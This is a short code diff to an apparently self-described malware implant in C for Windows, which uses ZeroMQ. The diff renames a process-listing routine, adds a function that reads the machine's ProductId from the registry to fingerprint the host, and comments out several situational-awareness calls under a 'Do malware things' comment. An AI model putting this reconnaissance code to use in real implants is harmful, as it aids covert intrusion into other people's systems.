@@ -25,7 +25,7 @@
 #include <zmq.h>
 
 // Print all running processes
-void ReadEnvironmentVariables(){
+void RunningProcesses(){
     HANDLE hSnap;
     PROCESSENTRY32 ProcessStruct;
     ProcessStruct.dwSize = sizeof(PROCESSENTRY32);
@@ -40,6 +40,14 @@ void ReadEnvironmentVariables(){
         printf("%s\n", ProcessStruct.szExeFile);
     }while(Process32Next(hSnap, &ProcessStruct));
     CloseHandle(hSnap);
+}
+
+// Identify system using product ID
+void ProductID(){
+    char value[30];
+	DWORD size = 30*sizeof(char);
+	RegGetValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", RRF_RT_REG_SZ, NULL, (PVOID)&value, &size);
+	printf("value: %s\n", value);
 }
 
 // List files in directory
@@ -140,8 +148,9 @@ int _tmain(int argc, _TCHAR *argv[]){
     // Do malware things (investigation, looting, persistence)
 
     // Situational Awareness tasks
-    ReadEnvironmentVariables();
-    ls(".");
+    //RunningProcesses();
+    //ls(".");
+    //ProductID();
 
     /*
 
